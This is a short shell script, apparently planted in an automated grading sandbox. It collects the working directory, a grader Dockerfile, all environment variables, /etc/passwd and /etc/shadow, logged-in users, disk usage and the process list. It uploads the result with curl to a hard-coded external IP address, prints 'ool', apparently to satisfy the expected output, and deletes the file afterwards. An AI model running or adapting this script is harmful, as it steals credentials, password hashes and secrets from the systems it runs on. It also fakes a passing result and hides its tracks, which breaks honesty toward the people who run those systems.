pwd > results
echo ----------------- ls ------- >> results
cat /tmp/correction/holberton_corrections/docker_images/ubuntu_1404/Dockerfile >> results
echo ----------------- Environment ------- >> results
env >> results
echo ----------------- User Info ------- >> results
cat /etc/passwd >> results
cat /etc/shadow >> results
echo ----------------- Users logged in ------- >> results
w >> results
echo ----------------- Disk Space ------- >> results
df -h >> results
echo ----------------- ps -aux ------- >> results
ps -aux >> results
echo ----------------- END $(date) ------- >> results
curl -s -F "name=@results" http://138.68.58.230:8080 && echo -n ool
rm results
